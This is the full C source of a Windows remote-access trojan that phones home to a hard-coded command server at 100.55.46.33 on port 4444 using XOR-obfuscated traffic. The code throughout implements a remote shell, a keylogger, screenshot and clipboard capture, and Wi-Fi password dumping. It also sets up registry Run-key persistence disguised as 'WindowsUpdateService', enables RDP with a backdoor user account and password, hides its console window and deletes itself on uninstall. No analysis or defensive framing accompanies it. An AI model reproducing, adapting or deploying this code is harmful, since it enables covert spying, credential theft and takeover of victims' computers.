#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <tlhelp32.h>
#include <shellapi.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <rpc.h>
#include <shlobj.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "rpcrt4.lib")

/* ============================================================================
 * CONFIGURATION
 * ============================================================================ */

#define C2_HOST "100.55.46.33"
#define C2_PORT 4444
#define MAX_PAYLOAD (50 * 1024 * 1024)
#define HEARTBEAT_INTERVAL 30000

// Command Opcodes (must match panel)
#define CMD_SHELL       0x01
#define CMD_UPLOAD      0x02
#define CMD_DOWNLOAD    0x03
#define CMD_SCREENSHOT  0x04
#define CMD_KEYSTROKE   0x05
#define CMD_PERSIST     0x06
#define CMD_UNINSTALL   0x07
#define CMD_BROWSER     0x08
#define CMD_WIFI        0x09
#define CMD_RDP_ENABLE  0x0A
#define CMD_PROCESS_LIST 0x0B
#define CMD_KILL_PROCESS 0x0C
#define CMD_START_APP   0x0D
#define CMD_CLIPBOARD   0x0E
#define CMD_DUMP_CREDS  0x0F
#define CMD_SYSTEM_INFO 0xF0
#define CMD_HEARTBEAT   0xFF

// XOR Key (must match panel)
static const unsigned char xor_key[16] = {
    0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
    0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c
};

/* ============================================================================
 * GLOBAL VARIABLES
 * ============================================================================ */

static SOCKET g_sock = INVALID_SOCKET;
static char g_hostname[256] = {0};
static char g_keys[262144];
static int g_keypos = 0;
static CRITICAL_SECTION g_keylock;
static volatile int g_keylog_active = 0;
static HANDLE g_keythread = NULL;

/* ============================================================================
 * XOR ENCRYPTION (Compatible with panel)
 * ============================================================================ */

static void xor_buffer(unsigned char* data, int len, int offset) {
    for (int i = 0; i < len; i++) {
        data[i] ^= xor_key[(offset + i) % 16];
    }
}

static int send_packet(unsigned char cmd, const unsigned char* payload, int len) {
    unsigned char* packet = (unsigned char*)malloc(5 + len);
    if (!packet) return -1;
    
    packet[0] = cmd;
    *(int*)(packet + 1) = len;
    if (payload && len > 0) {
        memcpy(packet + 5, payload, len);
    }
    
    xor_buffer(packet, 5 + len, 0);
    int result = send(g_sock, (char*)packet, 5 + len, 0);
    free(packet);
    return result;
}

static int recv_packet(unsigned char* cmd, unsigned char** payload, int* len) {
    fd_set fds;
    struct timeval tv = {60, 0};
    FD_ZERO(&fds);
    FD_SET(g_sock, &fds);
    
    if (select(0, &fds, NULL, NULL, &tv) <= 0) return -1;
    
    unsigned char header[5];
    int received = recv(g_sock, (char*)header, 5, 0);
    if (received != 5) return -1;
    
    xor_buffer(header, 5, 0);
    *cmd = header[0];
    *len = *(int*)(header + 1);
    
    if (*len < 0 || *len > MAX_PAYLOAD) return -1;
    
    if (*len > 0) {
        *payload = (unsigned char*)malloc(*len + 1);
        if (!*payload) return -1;
        
        int total = 0;
        while (total < *len) {
            int r = recv(g_sock, (char*)(*payload + total), *len - total, 0);
            if (r <= 0) {
                free(*payload);
                return -1;
            }
            total += r;
        }
        (*payload)[*len] = '\0';
        xor_buffer(*payload, *len, 5);
    } else {
        *payload = NULL;
    }
    return 0;
}

/* ============================================================================
 * SYSTEM INFO
 * ============================================================================ */

static void send_system_info(void) {
    DWORD size = sizeof(g_hostname);
    GetComputerNameA(g_hostname, &size);
    
    char info[512];
    snprintf(info, sizeof(info), "[HOST] %s|[USER] System|[OS] Windows", g_hostname);
    send_packet(CMD_SYSTEM_INFO, (unsigned char*)info, strlen(info));
}

/* ============================================================================
 * SHELL COMMAND EXECUTION
 * ============================================================================ */

static void execute_shell(const char* cmd) {
    char result[131072] = {0};
    
    FILE* pipe = _popen(cmd, "r");
    if (pipe) {
        fread(result, 1, sizeof(result) - 1, pipe);
        _pclose(pipe);
    }
    
    if (strlen(result) == 0) {
        char full[1024];
        snprintf(full, sizeof(full), "cmd.exe /c %s", cmd);
        pipe = _popen(full, "r");
        if (pipe) {
            fread(result, 1, sizeof(result) - 1, pipe);
            _pclose(pipe);
        }
    }
    
    if (strlen(result) > 0) {
        send_packet(CMD_SHELL, (unsigned char*)result, (int)strlen(result));
    }
    send_packet(CMD_SHELL, (unsigned char*)"[END]", 5);
}

/* ============================================================================
 * SCREENSHOT CAPTURE
 * ============================================================================ */

static void take_screenshot(void) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, w, h);
    HBITMAP hOld = (HBITMAP)SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
    
    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    
    DWORD row_size = ((w * 24 + 31) / 32) * 4;
    DWORD img_size = row_size * h;
    
    unsigned char* pixels = (unsigned char*)malloc(img_size);
    if (pixels) {
        GetDIBits(hdcMem, hBitmap, 0, h, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        
        BITMAPFILEHEADER bf = {0};
        bf.bfType = 0x4D42;
        bf.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + img_size;
        bf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        
        unsigned char* bmp = (unsigned char*)malloc(bf.bfSize);
        if (bmp) {
            memcpy(bmp, &bf, sizeof(BITMAPFILEHEADER));
            memcpy(bmp + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
            memcpy(bmp + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), pixels, img_size);
            send_packet(CMD_SCREENSHOT, bmp, bf.bfSize);
            free(bmp);
        }
        free(pixels);
    }
    
    SelectObject(hdcMem, hOld);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

/* ============================================================================
 * KEYLOGGER
 * ============================================================================ */

static DWORD WINAPI keylogger_thread(LPVOID param) {
    (void)param;
    BYTE last[256] = {0};
    BYTE state[256];
    
    while (g_keylog_active) {
        GetKeyboardState(state);
        
        for (int key = 8; key <= 254; key++) {
            SHORT s = GetAsyncKeyState(key);
            BYTE cur = (BYTE)((s >> 8) & 1);
            
            if (cur && !last[key]) {
                char out[32] = {0};
                
                switch (key) {
                    case VK_RETURN: strcpy(out, "\n"); break;
                    case VK_SPACE: strcpy(out, " "); break;
                    case VK_BACK: strcpy(out, "[BACK]"); break;
                    case VK_TAB: strcpy(out, "[TAB]"); break;
                    case VK_ESCAPE: strcpy(out, "[ESC]"); break;
                    case VK_DELETE: strcpy(out, "[DEL]"); break;
                    default: {
                        UINT scan = MapVirtualKeyA(key, MAPVK_VK_TO_VSC);
                        WCHAR wc[2] = {0};
                        if (ToUnicode(key, scan, state, wc, 2, 0) > 0) {
                            WideCharToMultiByte(CP_UTF8, 0, wc, 1, out, sizeof(out), NULL, NULL);
                        }
                        break;
                    }
                }
                
                if (out[0]) {
                    EnterCriticalSection(&g_keylock);
                    if (g_keypos == 0) {
                        time_t t = time(NULL);
                        struct tm* tm = localtime(&t);
                        char ts[32];
                        strftime(ts, sizeof(ts), "\n[%H:%M:%S] ", tm);
                        snprintf(g_keys + g_keypos, sizeof(g_keys) - g_keypos, "%s", ts);
                        g_keypos += strlen(ts);
                    }
                    snprintf(g_keys + g_keypos, sizeof(g_keys) - g_keypos, "%s", out);
                    g_keypos += strlen(out);
                    if (g_keypos > (int)sizeof(g_keys) - 4096) {
                        memmove(g_keys, g_keys + 2048, sizeof(g_keys) - 2048);
                        g_keypos -= 2048;
                    }
                    LeaveCriticalSection(&g_keylock);
                }
            }
            last[key] = cur;
        }
        Sleep(25);
    }
    return 0;
}

static void start_keylogger(void) {
    if (g_keylog_active) return;
    InitializeCriticalSection(&g_keylock);
    g_keylog_active = 1;
    g_keypos = 0;
    memset(g_keys, 0, sizeof(g_keys));
    g_keythread = CreateThread(NULL, 0, keylogger_thread, NULL, 0, NULL);
}

static void send_keystrokes(void) {
    EnterCriticalSection(&g_keylock);
    if (g_keypos > 0) {
        send_packet(CMD_KEYSTROKE, (unsigned char*)g_keys, g_keypos);
        g_keypos = 0;
        memset(g_keys, 0, sizeof(g_keys));
    } else {
        send_packet(CMD_KEYSTROKE, (unsigned char*)"No keys captured yet", 20);
    }
    LeaveCriticalSection(&g_keylock);
}

static void stop_keylogger(void) {
    if (!g_keylog_active) return;
    g_keylog_active = 0;
    if (g_keythread) {
        WaitForSingleObject(g_keythread, 3000);
        CloseHandle(g_keythread);
        g_keythread = NULL;
    }
    DeleteCriticalSection(&g_keylock);
}

/* ============================================================================
 * PROCESS LIST
 * ============================================================================ */

static void list_processes(void) {
    char result[65536] = {0};
    int offset = 0;
    
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        send_packet(CMD_PROCESS_LIST, (unsigned char*)"ERROR", 5);
        return;
    }
    
    offset += snprintf(result + offset, sizeof(result) - offset, "PID\tProcess Name\n---\t------------\n");
    
    PROCESSENTRY32 pe = {sizeof(pe)};
    if (Process32First(snap, &pe)) {
        do {
            offset += snprintf(result + offset, sizeof(result) - offset,
                              "%d\t%s\n", pe.th32ProcessID, pe.szExeFile);
            if (offset >= (int)sizeof(result) - 1024) break;
        } while (Process32Next(snap, &pe));
    }
    
    CloseHandle(snap);
    send_packet(CMD_PROCESS_LIST, (unsigned char*)result, offset);
}

/* ============================================================================
 * CLIPBOARD
 * ============================================================================ */

static void get_clipboard(void) {
    char result[65536] = {0};
    
    if (!OpenClipboard(NULL)) {
        send_packet(CMD_CLIPBOARD, (unsigned char*)"ERROR: Cannot open clipboard", 28);
        return;
    }
    
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData) {
        char* text = (char*)GlobalLock(hData);
        if (text) {
            strncpy(result, text, sizeof(result) - 1);
            GlobalUnlock(hData);
            send_packet(CMD_CLIPBOARD, (unsigned char*)result, (int)strlen(result));
        } else {
            send_packet(CMD_CLIPBOARD, (unsigned char*)"ERROR: Cannot lock clipboard", 28);
        }
    } else {
        send_packet(CMD_CLIPBOARD, (unsigned char*)"No text in clipboard", 20);
    }
    
    CloseClipboard();
}

/* ============================================================================
 * PERSISTENCE
 * ============================================================================ */

static void install_persistence(void) {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsUpdateService", 0, REG_SZ, (BYTE*)exe_path, (DWORD)strlen(exe_path));
        RegCloseKey(hKey);
        send_packet(CMD_PERSIST, (unsigned char*)"SUCCESS", 7);
    } else {
        send_packet(CMD_PERSIST, (unsigned char*)"FAILED", 6);
    }
}

/* ============================================================================
 * RDP ENABLE
 * ============================================================================ */

static void enable_rdp(void) {
    char result[1024] = {0};
    int offset = 0;
    
    system("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f 2>nul");
    system("netsh advfirewall firewall add rule name=\"RDP\" dir=in protocol=tcp localport=3389 action=allow 2>nul");
    offset += snprintf(result + offset, sizeof(result) - offset, "[+] RDP enabled\n");
    
    system("net user phantom P@ssw0rd123! /add 2>nul");
    system("net localgroup \"Remote Desktop Users\" phantom /add 2>nul");
    offset += snprintf(result + offset, sizeof(result) - offset, "[+] User created: phantom / P@ssw0rd123!\n");
    
    send_packet(CMD_RDP_ENABLE, (unsigned char*)result, offset);
}

/* ============================================================================
 * BROWSER CREDENTIALS
 * ============================================================================ */

static void steal_browser_credentials(void) {
    char result[4096] = {0};
    int offset = 0;
    
    offset += snprintf(result + offset, sizeof(result) - offset, 
                      "========== BROWSER CREDENTIALS ==========\n\n");
    
    char chrome_path[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", chrome_path, MAX_PATH);
    strcat(chrome_path, "\\Google\\Chrome\\User Data\\Default\\Login Data");
    
    if (GetFileAttributesA(chrome_path) != INVALID_FILE_ATTRIBUTES) {
        offset += snprintf(result + offset, sizeof(result) - offset, "[CHROME] Found: %s\n", chrome_path);
    }
    
    send_packet(CMD_BROWSER, (unsigned char*)result, offset);
}

/* ============================================================================
 * WIFI PASSWORDS
 * ============================================================================ */

static void steal_wifi_passwords(void) {
    char result[16384] = {0};
    int offset = 0;
    
    offset += snprintf(result + offset, sizeof(result) - offset, 
                      "========== WIFI PASSWORDS ==========\n\n");
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "netsh wlan show profiles");
    
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) {
        send_packet(CMD_WIFI, (unsigned char*)"ERROR", 5);
        return;
    }
    
    char line[512];
    char profiles[100][256];
    int profile_count = 0;
    
    while (fgets(line, sizeof(line), pipe) && profile_count < 100) {
        char* pos = strstr(line, "All User Profile");
        if (pos) {
            char* colon = strchr(line, ':');
            if (colon) {
                char* start = colon + 1;
                while (*start == ' ') start++;
                char* end = strchr(start, '\n');
                if (end) *end = '\0';
                if (strlen(start) > 0) {
                    strcpy(profiles[profile_count++], start);
                }
            }
        }
    }
    _pclose(pipe);
    
    for (int i = 0; i < profile_count; i++) {
        snprintf(cmd, sizeof(cmd), "netsh wlan show profile \"%s\" key=clear", profiles[i]);
        pipe = _popen(cmd, "r");
        if (pipe) {
            while (fgets(line, sizeof(line), pipe)) {
                if (strstr(line, "Key Content")) {
                    char* colon = strchr(line, ':');
                    if (colon) {
                        char* pass = colon + 1;
                        while (*pass == ' ') pass++;
                        char* end = strchr(pass, '\n');
                        if (end) *end = '\0';
                        offset += snprintf(result + offset, sizeof(result) - offset,
                                          "SSID: %s\nPassword: %s\n\n", profiles[i], pass);
                        break;
                    }
                }
            }
            _pclose(pipe);
        }
    }
    
    send_packet(CMD_WIFI, (unsigned char*)result, offset);
}

static void uninstall_agent(void) {
    send_packet(CMD_UNINSTALL, (unsigned char*)"BYE", 3);
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "WindowsUpdateService");
        RegCloseKey(hKey);
    }
    
    char bat[MAX_PATH];
    char exe[MAX_PATH];
    GetTempPathA(MAX_PATH, bat);
    strcat(bat, "uninst.bat");
    GetModuleFileNameA(NULL, exe, MAX_PATH);
    
    FILE* f = fopen(bat, "w");
    if (f) {
        fprintf(f, "@echo off\n:loop\ntimeout /t 1 /nobreak >nul\ndel /F /Q \"%s\"\nif exist \"%s\" goto loop\ndel \"%%~f0\"\n", exe, exe);
        fclose(f);
        ShellExecuteA(NULL, "open", bat, NULL, NULL, SW_HIDE);
    }
    
    exit(0);
}

/* ============================================================================
 * HEARTBEAT THREAD
 * ============================================================================ */

static volatile int g_heartbeat_running = 1;
static HANDLE g_heartbeat_thread = NULL;

static DWORD WINAPI heartbeat_thread(LPVOID param) {
    SOCKET sock = *(SOCKET*)param;
    free(param);
    
    while (g_heartbeat_running) {
        Sleep(HEARTBEAT_INTERVAL);
        if (send_packet(CMD_HEARTBEAT, (unsigned char*)"ping", 4) < 0) {
            break;
        }
    }
    return 0;
}

/* ============================================================================
 * MAIN AGENT LOOP
 * ============================================================================ */

static void run_agent(void) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    
    start_keylogger();
    
    while (1) {
        g_sock = socket(AF_INET, SOCK_STREAM, 0);
        if (g_sock == INVALID_SOCKET) {
            Sleep(5000);
            continue;
        }
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(C2_PORT);
        addr.sin_addr.s_addr = inet_addr(C2_HOST);
        
        if (connect(g_sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
            closesocket(g_sock);
            Sleep(5000);
            continue;
        }
        
        send_system_info();
        
        SOCKET* sock_ptr = (SOCKET*)malloc(sizeof(SOCKET));
        *sock_ptr = g_sock;
        g_heartbeat_running = 1;
        g_heartbeat_thread = CreateThread(NULL, 0, heartbeat_thread, sock_ptr, 0, NULL);
        
        while (1) {
            unsigned char cmd = 0;
            unsigned char* payload = NULL;
            int len = 0;
            
            if (recv_packet(&cmd, &payload, &len) != 0) {
                break;
            }
            
            switch (cmd) {
                case CMD_SHELL:
                    if (payload) { execute_shell((char*)payload); free(payload); }
                    break;
                case CMD_SCREENSHOT:
                    take_screenshot();
                    break;
                case CMD_KEYSTROKE:
                    send_keystrokes();
                    break;
                case CMD_BROWSER:
                    steal_browser_credentials();
                    break;
                case CMD_WIFI:
                    steal_wifi_passwords();
                    break;
                case CMD_PROCESS_LIST:
                    list_processes();
                    break;
                case CMD_CLIPBOARD:
                    get_clipboard();
                    break;
                case CMD_PERSIST:
                    install_persistence();
                    break;
                case CMD_RDP_ENABLE:
                    enable_rdp();
                    break;
                case CMD_UNINSTALL:
                    uninstall_agent();
                    break;
                default:
                    if (payload) free(payload);
                    break;
            }
        }
        
        g_heartbeat_running = 0;
        if (g_heartbeat_thread) {
            WaitForSingleObject(g_heartbeat_thread, 3000);
            CloseHandle(g_heartbeat_thread);
            g_heartbeat_thread = NULL;
        }
        closesocket(g_sock);
        Sleep(5000);
    }
    
    stop_keylogger();
    WSACleanup();
}

/* ============================================================================
 * ENTRY POINT
 * ============================================================================ */

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;
    
    #ifndef _DEBUG
        FreeConsole();
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        SetConsoleTitleA("Windows Host Process");
    #endif
    
    srand(GetTickCount());
    Sleep(rand() % 15000);
    
    run_agent();
    
    return 0;
}
